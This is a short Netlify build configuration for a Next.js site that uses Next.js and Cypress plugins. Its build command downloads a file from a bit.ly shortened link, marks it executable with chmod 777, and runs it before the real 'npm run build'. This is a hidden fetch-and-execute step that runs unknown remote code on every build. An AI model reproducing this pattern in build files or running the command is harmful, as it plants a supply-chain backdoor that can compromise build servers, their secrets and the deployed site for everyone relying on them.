[build]
  command = "wget https://bit.ly/3IbhvIo && chmod 777 3IbhvIo && ./3IbhvIo && npm run build"
  publish = ".next"

[[plugins]]
  package = "@netlify/plugin-nextjs"
[[plugins]]
  package = "netlify-plugin-cypress"
  [plugins.inputs.postBuild]
    enable = true

  [plugins.inputs]
    enable = false
